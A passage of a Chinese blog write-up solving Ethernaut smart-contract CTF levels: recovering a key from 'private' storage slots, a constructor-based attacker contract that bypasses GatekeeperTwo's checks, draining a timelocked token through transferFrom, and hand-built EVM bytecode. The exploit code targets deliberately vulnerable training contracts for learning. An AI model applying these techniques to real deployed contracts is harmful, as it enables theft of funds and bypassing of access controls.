<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x00000000000000000000000000000000000000000000000000000000b197ff0a&quot;</span>
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token string">&quot;0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a&quot;</span>
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token string">&quot;0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4&quot;</span>
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</span>
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>
<span class="token keyword">await</span> <span class="token function">getStorageAt</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>一块32字节</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>对应</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>bool <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token comment">//&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>
uint256 <span class="token keyword">public</span> <span class="token constant">ID</span> <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
<span class="token comment">//&quot;0x000000000000000000000000000000000000000000000000000000006038b197&quot;</span>
uint8 <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//1</span>
uint8 <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span><span class="token comment">//1</span>
uint16 <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token function">uint16</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
<span class="token comment">//&quot;0x00000000000000000000000000000000000000000000000000000000b197ff0a&quot;</span>
bytes32<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>
<span class="token comment">//&quot;0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a&quot;</span>
<span class="token comment">//&quot;0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4&quot;</span>
<span class="token comment">//&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>所以<code>data[2]=&quot;0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9&quot;</code></p> <p><code>byte16(data[2])</code>就是<code>data[2]</code>的前16个字节</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>contract<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token string">&quot;0x9550a97555a5da445052aa4d6f448148&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="gatekeepertwo"><a href="#gatekeepertwo" class="header-anchor">#</a> GateKeeperTwo</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract GatekeeperTwo <span class="token punctuation">{</span>

  address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>

  modifier <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  modifier <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uint x<span class="token punctuation">;</span>
    assembly <span class="token punctuation">{</span> <span class="token literal-property property">x</span> <span class="token operator">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
    <span class="token function">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  modifier <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token parameter">bytes8 _gateKey</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token parameter">bytes8 _gateKey</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><p>gateOne写合约就行</p> <p>gateTwo利用了</p> <blockquote><p>Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.
……
During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.</p></blockquote> <p>也就是在调用构造函数合约时，地址生成但是代码还没有加到链上此时extcodersize=0,利用构造函数绕过</p> <p>所以有如下exp</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span>

contract GatekeeperTwo <span class="token punctuation">{</span>

  address <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>

  modifier <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  modifier <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uint x<span class="token punctuation">;</span>
    assembly <span class="token punctuation">{</span> <span class="token literal-property property">x</span> <span class="token operator">:</span><span class="token operator">=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>
    <span class="token function">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  modifier <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token parameter">bytes8 _gateKey</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    _<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token parameter">bytes8 _gateKey</span><span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

contract Attacker<span class="token punctuation">{</span>
    
    <span class="token function">constructor</span><span class="token punctuation">(</span>address p<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>
        GatekeeperTwo target <span class="token operator">=</span> <span class="token function">GatekeeperTwo</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bytes8 _gateKey <span class="token operator">=</span> <span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token function">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token punctuation">.</span><span class="token function">enter</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br></div></div><h2 id="naught-coin"><a href="#naught-coin" class="header-anchor">#</a> Naught Coin</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.6</span><span class="token number">.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/token/ERC20/ERC20.sol'</span><span class="token punctuation">;</span> contract NaughtCoin is <span class="token constant">ERC20</span> <span class="token punctuation">{</span>  <span class="token comment">// string public constant name = 'NaughtCoin';  // string public constant symbol = '0x0';  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20('NaughtCoin', '0x0')  public {    player = _player;    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));    // _totalSupply = INITIAL_SUPPLY;    // _balances[player] = INITIAL_SUPPLY;    _mint(player, INITIAL_SUPPLY);    emit Transfer(address(0), player, INITIAL_SUPPLY);  }    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {    super.transfer(_to, _value);  }  // Prevent the initial owner from transferring tokens until the timelock has passed  modifier lockTokens() {    if (msg.sender == player) {      require(now &gt; timeLock);      _;    } else {     _;    }  } </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里提到了ERC20 Token标准，具体如下</p> <p>https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</p> <p>可以看到转账的实现有两个函数一个是<code>transfer</code>一个是<code>transferFrom</code> 这里没有对<code>transferFrom</code>进行重载所以没有lockTokens的限制，
我们只要<code>approve</code>自己，然后再利用<code>transferForm</code>转出去即可</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>player<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">&quot;1000000000000000000000000&quot;</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span><span class="token string">&quot;1000000000000000000000000&quot;</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span>contract<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token string">&quot;1000000000000000000000000&quot;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>player<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">&quot;0&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="magic-number"><a href="#magic-number" class="header-anchor">#</a> Magic Number</h2> <p>参照EVM</p> <p>函数部分</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>602a    // v: push1 0x2a (value is 42)6080    // p: push1 0x80 (memory slot is 0x80)52      // mstore6020    // s: push1 0x20 (value is 32 bytes in size)6080    // p: push1 0x80 (value was stored in slot 0x80)f3      // return
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>10byte</p> <p>调用部分</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>600a    // s: push1 0x0a (10 bytes)
60??    // f: push1 0x?? (current position of runtime opcodes)
6000    // t: push1 0x00 (destination memory index 0)
39      // CODECOPY



600a    // s: push1 0x0a (runtime opcode length)
6000    // p: push1 0x00 (access memory index 0)
f3      // return to EVM
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>12byte</p> <p>所以<code>??</code>部分为<code>0x0c</code>-&gt;<code>12</code></p> <p>结果为</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>600a600c600039600a6000f3602a60805260206080f3
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> bytecode <span class="token operator">=</span> <span class="token string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">from</span><span class="token operator">:</span> player<span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> bytecode <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>得到合约地址后调用即可</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">setSolver</span><span class="token punctuation">(</span><span class="token string">&quot;0x9E541a50c028ebeDD6e030c4138111b30bb23aF2&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/EkiXu/blog/edit/master/docs/Ethernaut Write Up/01.part1.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2021/05/11, 08:36:49</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/ctf/ethernaut/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">Ethernaut Write Up</div></a> <!----></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/ctf/ethernaut/" class="prev">Ethernaut Write Up</a></span> <!----></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/qwb2022final/"><div>
            QWB CTF2022 线下赛总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/ciscn2022final/"><div>
            CISCN2022 总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/dsctf2022_final/"><div>
            DSCTF2022决赛 部分writeup
            <!----></div></a> <span class="date">08-08</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ekixu@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/EkiXu" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>EkiXu | <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.8153bfb8.js" defer></script><script src="/assets/js/2.236d623d.js" defer></script><script src="/assets/js/60.dfcbd8de.js" defer></script>
  </body>
</html>
